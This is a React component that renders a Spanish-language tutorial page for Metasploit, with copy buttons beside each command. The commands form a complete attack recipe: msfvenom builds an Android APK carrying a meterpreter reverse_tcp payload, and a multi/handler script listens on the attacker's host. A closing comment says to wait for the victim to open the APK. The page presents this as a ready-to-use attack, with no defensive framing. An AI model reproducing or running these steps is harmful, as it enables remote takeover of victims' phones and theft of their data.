/* eslint-disable react/no-unknown-property */
import { useState, useEffect } from 'react';

import Copy from '../assets/copy';
import Check from '../assets/check';

function Metasploit() {
  const [copy1, setCopy1] = useState(false);
  const [copy2, setCopy2] = useState(false);
  const [copy3, setCopy3] = useState(false);
  const [copy4, setCopy4] = useState(false);
  const [copy5, setCopy5] = useState(false);

  useEffect(() => {
    if (copy1 || copy2 || copy3 || copy4 || copy5) {
      setTimeout(() => {
        setCopy1(false);
        setCopy2(false);
        setCopy3(false);
        setCopy4(false);
        setCopy5(false);
      }, 2000);
    }
  }, [copy1, copy2, copy3, copy4, copy5]);
  return (
    <section className="w-full px-10 pt-28 mx-auto max-w-7xl">
      <div className="space-y-12 md:text-left">
        <div className=" space-y-5 sm:mx-auto sm:space-y-4">
          <h2 className="pt-10 pb-5 text-4xl font-black text-center text-white sm:text-6xl">
            <span className="text-transparent bg-clip-text bg-gradient-to-r from-cyan-300 via-cyan-500 to-cyan-100">
              Metasploit
            </span>
          </h2>
          <h1 className="text-3xl font-normal text-center text-white pb-5">
            Metasploit es una herramienta de código abierto que proporciona a
            los desarrolladores y administradores de sistemas una plataforma
            para desarrollar, probar y explotar vulnerabilidades.
          </h1>

          <div className=" bg-zinc-900 p-4 px-12 rounded-lg justify-between flex items-center shadow-lg">
            <code className="text-white text-xl">
              <span className="text-zinc-500"># Ver nuestra ip</span>
              <br />$ ifconfig
            </code>
            <button
              onClick={() => {
                setCopy1(true);
                navigator.clipboard.writeText('ifconfig');
              }}
              className="hover:bg-zinc-700 p-2 rounded-lg transition duration-0 hover:duration-150 delay-100"
            >
              {copy1 ? (
                <Check className="fill-green-400" />
              ) : (
                <Copy className="fill-zinc-400" />
              )}
            </button>
          </div>
          <div className=" bg-zinc-900 p-4 px-12 rounded-lg justify-between flex items-center shadow-lg">
            <code className="text-white text-xl">
              <span className="text-zinc-500">
                # Usamos msfvenom para generar nuestra apk
              </span>
              <br />$ msfvenom -p android/meterpreter/reverse_tcp LHOST=ip
              LPORT=666 -o directorio/#.apk
            </code>
            <button
              onClick={() => {
                setCopy2(true);
                navigator.clipboard.writeText(
                  'msfvenom -p android/meterpreter/reverse_tcp LHOST=ip LPORT=666 -o directorio/#.apk'
                );
              }}
              className="hover:bg-zinc-700 p-2 rounded-lg transition duration-0 hover:duration-150 delay-100"
            >
              {copy2 ? (
                <Check className="fill-green-400" />
              ) : (
                <Copy className="fill-zinc-400" />
              )}
            </button>
          </div>
          <div className=" bg-zinc-900 p-4 px-12 rounded-lg justify-between flex items-center shadow-lg">
            <code className="text-white text-xl">
              <span className="text-zinc-500">
                # Creamos un archivo para ejecutar el payload con los siguientes
                comandos
              </span>
              <br />$ touch script
              <br />$ nano script
              <br />
            </code>
            <button
              onClick={() => {
                setCopy3(true);
                navigator.clipboard.writeText('touch script && nano script');
              }}
              className="hover:bg-zinc-700 p-2 rounded-lg transition duration-0 hover:duration-150 delay-100"
            >
              {copy3 ? (
                <Check className="fill-green-400" />
              ) : (
                <Copy className="fill-zinc-400" />
              )}
            </button>
          </div>
          <div className=" bg-zinc-900 p-4 px-12 rounded-lg justify-between flex items-center shadow-lg">
            <code className="text-white text-xl">
              $ use exploit/multi/handler <br />
              $ set payload android/meterpreter/reverse_tcp <br />
              $ set LHOST ip <br />
              $ set LPORT 666 <br />$ exploit
            </code>
            <button
              onClick={() => {
                setCopy4(true);
                navigator.clipboard.writeText(
                  'use exploit/multi/handler \n set payload android/meterpreter/reverse_tcp \n set LHOST ip \n set LPORT 666 \n exploit'
                );
              }}
              className="hover:bg-zinc-700 p-2 rounded-lg transition duration-0 hover:duration-150 delay-100"
            >
              {copy4 ? (
                <Check className="fill-green-400" />
              ) : (
                <Copy className="fill-zinc-400" />
              )}
            </button>
          </div>
          <div className=" bg-zinc-900 p-4 px-12 rounded-lg justify-between flex items-center shadow-lg">
            <code className="text-white text-xl">
              <span className="text-zinc-500">
                # Ejecutamos el script y esperamos a que la victima abra la apk
              </span>
              <br />$ msfconsole -r script
            </code>
            <button
              onClick={() => {
                setCopy5(true);
                navigator.clipboard.writeText('msfconsole -r script');
              }}
              className="hover:bg-zinc-700 p-2 rounded-lg transition duration-0 hover:duration-150 delay-100"
            >
              {copy5 ? (
                <Check className="fill-green-400" />
              ) : (
                <Copy className="fill-zinc-400" />
              )}
            </button>
          </div>
        </div>
      </div>
    </section>
  );
}

export default Metasploit;
